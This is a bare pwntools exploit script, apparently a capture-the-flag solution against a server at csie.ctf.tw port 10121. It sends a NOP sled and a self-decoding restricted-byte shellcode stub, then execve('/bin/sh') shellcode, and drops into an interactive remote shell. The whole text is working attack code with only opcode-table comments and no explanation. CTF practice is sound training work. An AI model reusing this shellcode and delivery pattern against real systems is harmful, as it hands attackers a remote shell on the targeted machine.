from pwn import *

context.arch = 'amd64'
#base       6a  4 2     8   2
#push rdx   52  4   1       2      38
#pop  rdx   5a  4   1   8   2      30
#pop  rsi   5e  4   1   8 4 2      34
#pop  rcx   59  4   1   8     1    33

a = asm("""
        pushf
        pushf
        xor dword ptr [rdx+0x70], 0x6a6a6a6a
        .byte 0x38
        .byte 0x34
        .byte 0x33
        .byte 0x30
        syscall
        """)

a = b'\x90'*103+a
r = remote("csie.ctf.tw","10121")
r.send(a)

a=a+asm("""
        mov rdi,0x0068732F6E69622F
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
        """)
r.send(a)
r.interactive()
